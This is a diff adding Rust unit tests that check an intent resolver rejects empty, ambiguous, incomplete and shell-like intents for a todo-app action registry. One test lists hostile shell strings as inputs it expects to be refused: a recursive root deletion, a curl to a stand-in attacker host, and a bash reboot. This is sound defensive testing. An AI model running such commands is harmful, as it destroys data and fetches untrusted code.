@@ -306,4 +306,64 @@ mod tests {
         assert_eq!(result.schema, "snapshot");
         assert!(result.effects.contains(&Effect::Read));
     }
+
+    #[test]
+    fn empty_intent_fails_closed() {
+        let err = resolve_intent("   ", &todo_registry()).unwrap_err();
+        assert!(err.contains("empty"), "{err}");
+    }
+
+    #[test]
+    fn shell_like_intents_fail_closed() {
+        for intent in [
+            "rm -rf /",
+            "curl http://evil.example/x",
+            "bash -c 'reboot'",
+            "frobnicate xyzzy",
+        ] {
+            let err = resolve_intent(intent, &todo_registry()).unwrap_err();
+            assert!(err.contains("fail closed"), "{intent}: {err}");
+        }
+    }
+
+    #[test]
+    fn ambiguous_short_intent_fails_closed() {
+        // `todo` ties todo.add / todo.toggle / todo.delete at the same score.
+        let err = resolve_intent("todo", &todo_registry()).unwrap_err();
+        assert!(err.contains("ambiguous"), "{err}");
+    }
+
+    #[test]
+    fn invoke_without_required_title_fails() {
+        let err = resolve_intent("todo.add", &todo_registry()).unwrap_err();
+        assert!(err.contains("title"), "{err}");
+    }
+
+    #[test]
+    fn invoke_without_required_id_fails() {
+        let err = resolve_intent("todo.toggle", &todo_registry()).unwrap_err();
+        assert!(err.contains("id"), "{err}");
+    }
+
+    #[test]
+    fn click_without_stable_id_fails() {
+        let err = resolve_intent("click the button", &todo_registry()).unwrap_err();
+        assert!(
+            err.contains("stable id") || err.contains("fail closed") || err.contains("ambiguous"),
+            "{err}"
+        );
+    }
+
+    #[test]
+    fn type_and_key_intents_do_not_materialize_from_prose() {
+        for intent in ["type", "key"] {
+            let err = resolve_intent(intent, &todo_registry()).unwrap_err();
+            assert!(
+                err.contains("materialize")
+                    || err.contains("fail closed")
+                    || err.contains("ambiguous"),
+                "{intent}: {err}"
+            );
+        }
+    }
 }
